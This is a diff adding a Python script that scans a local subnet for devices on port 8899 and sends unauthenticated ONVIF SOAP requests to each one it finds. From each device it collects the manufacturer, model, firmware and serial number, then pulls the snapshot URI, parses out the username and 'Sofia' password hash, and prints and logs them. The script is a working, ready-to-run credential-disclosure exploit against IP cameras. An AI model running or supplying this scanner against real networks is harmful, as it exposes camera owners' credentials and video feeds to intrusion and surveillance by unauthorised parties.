@@ -1,0 +1,196 @@
+import socket
+import requests
+import re
+import sys
+import logging
+from html import unescape
+
+
+def make_request(ip):
+    url_device = f"http://{ip}:8899/onvif/Device"
+    url_media = f"http://{ip}:8899/onvif/Media"
+
+    headers = {
+        "Content-Type": "application/soap+xml; charset=utf-8",
+        "Accept-Encoding": "gzip",
+        "User-Agent": "okhttp/3.12.5",
+    }
+
+    xml_payload_device_information = """
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                   xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+                   xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+        <soap:Header>
+            <Security xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
+                <UsernameToken>
+                    <Username></Username>
+                    <Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest"></Password>
+                    <Nonce EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary"></Nonce>
+                    <Created xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"></Created>
+                </UsernameToken>
+            </Security>
+        </soap:Header>
+        <soap:Body>
+            <GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/>
+        </soap:Body>
+    </soap:Envelope>
+    """
+
+    xml_payload_snapshot_uri = """
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                   xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+                   xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+        <soap:Header>
+            <Security xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
+                <UsernameToken>
+                    <Username></Username>
+                    <Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest"></Password>
+                    <Nonce EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary"></Nonce>
+                    <Created xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"></Created>
+                </UsernameToken>
+            </Security>
+        </soap:Header>
+        <soap:Body>
+            <GetSnapshotUri xmlns="http://www.onvif.org/ver10/media/wsdl">
+                <ProfileToken>000</ProfileToken>
+            </GetSnapshotUri>
+        </soap:Body>
+    </soap:Envelope>
+    """
+
+
+    response_device_information = requests.post(url_device, headers=headers, data=xml_payload_device_information)
+    if response_device_information:
+        #print(f"Response from server (DeviceInformation):\n{response_device_information.text}")
+        logging.info(f"Response from server (DeviceInformation): \n {response_device_information.text}")
+
+        pattern_Manufacturer = re.compile(r'<tds:Manufacturer>(.*?)</tds:Manufacturer>', re.DOTALL)
+        pattern_Model = re.compile(r'<tds:Model>(.*?)</tds:Model>', re.DOTALL)
+        pattern_FirmwareVersion = re.compile(r'<tds:FirmwareVersion>(.*?)</tds:FirmwareVersion>', re.DOTALL)
+        pattern_SerialNumber = re.compile(r'<tds:SerialNumber>(.*?)</tds:SerialNumber>', re.DOTALL)
+        pattern_HardwareID = re.compile(r'<tds:HardwareId>(.*?)</tds:HardwareId>', re.DOTALL)
+
+        Manufacturer = search_by_pattern(pattern_Manufacturer, response_device_information.text)
+        Model = search_by_pattern(pattern_Model, response_device_information.text)
+        FirmwareVersion = search_by_pattern(pattern_FirmwareVersion, response_device_information.text)
+        SerialNumber = search_by_pattern(pattern_SerialNumber, response_device_information.text)
+        HardwareID = search_by_pattern(pattern_HardwareID, response_device_information.text)
+
+        if Manufacturer != None:
+            print(f"Manufacturer: {Manufacturer}")
+            logging.info(f"Manufacturer: {Manufacturer}")
+
+        if Model != None:
+            print(f"Model: {Model}")
+            logging.info(f"Model: {Model}")
+
+        if FirmwareVersion != None:
+            print(f"Firmware Version: {FirmwareVersion}")
+            logging.info(f"Firmware Version: {FirmwareVersion}")
+
+        if SerialNumber != None:
+            print(f"Serial Number: {SerialNumber}")
+            logging.info(f"Serial Number: {SerialNumber}")
+
+        if HardwareID != None:
+            print(f"Hardware ID: {HardwareID}")
+            logging.info(f"Hardware ID: {HardwareID}")
+
+
+    response_snapshot_uri = requests.post(url_media, headers=headers, data=xml_payload_snapshot_uri)
+    if response_snapshot_uri:
+        #print(f"Response from server (SnapshotURI):\n{response_snapshot_uri.text}")
+        logging.info(f"Response from server (SnapshotURI):\n{response_snapshot_uri.text}")
+
+        pattern_SnapshotURI = re.compile(r'<tt:Uri>(.*?)</tt:Uri>', re.DOTALL)
+
+        pattern_UserName = re.compile(r'&user=(.*?)&', re.DOTALL)
+        pattern_PasswordHash = re.compile(r'&password=(.*?)$', re.DOTALL)
+
+        SnapshotURI = search_by_pattern(pattern_SnapshotURI, response_snapshot_uri.text)
+
+        if SnapshotURI != None:
+            SnapshotURI = unescape(SnapshotURI.replace("&amp;", "&"))
+            
+            print(f"Snapshot URI: {SnapshotURI}")
+            logging.info(f"Snapshot URI: {SnapshotURI}")
+        
+            UserName = search_by_pattern(pattern_UserName, SnapshotURI)
+            PasswordHash = search_by_pattern(pattern_PasswordHash, SnapshotURI)
+
+            if UserName != None:
+                print(f"User Name: {UserName}")
+                logging.info(f"User Name: {UserName}")
+
+            if PasswordHash != None:
+                print(f"Password Hash (Sofia): {PasswordHash}")
+                logging.info(f"Password Hash (Sofia): {PasswordHash}")
+
+
+def search_by_pattern(pattern, text):
+    match = pattern.search(text)
+    if match:
+        return match.group(1)
+    else:
+        return None
+
+
+def check_ip(ip):
+    try:
+        with socket.create_connection((ip, 8899), timeout=0.5):
+            print(f"IP: {ip} is online (port 8899).")
+            logging.info(f"IP: {ip} is online (port 8899).")
+            return True
+    except (socket.timeout, socket.error):
+        return False
+
+
+def scan_network(base_ip):
+    for i in range(1, 255):
+        ip = f"{base_ip}{i}"
+        print(ip)
+        logging.info(ip)
+        if check_ip(ip):
+            make_request(ip)
+
+
+def get_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80)) # Google DNS
+        ip_address = s.getsockname()[0]
+    finally:
+        s.close()
+    return ip_address
+
+
+def get_base_ip():
+    ip_address = get_ip()
+    base_ip = '.'.join(ip_address.split('.')[:-1]) + '.'
+    return base_ip
+
+
+if __name__ == "__main__":
+    logging.basicConfig(
+        filename='app.log',
+        filemode='a',
+        format='%(asctime)s - %(levelname)s - %(message)s',
+        level=logging.DEBUG
+    )
+    
+    base_ip = get_base_ip() # "192.168.0."
+    
+    if len(sys.argv) == 2:
+        base_ip = sys.argv[1];
+    
+    print(f"Base IP: {base_ip}\n")
+    logging.info(f"Base IP: {base_ip}\n")
+
+    print("Scanning the network...")
+    logging.info("Scanning the network...")
+    scan_network(base_ip)
+    print("Scanning complette!");
+    logging.info("Scanning complette!");
+
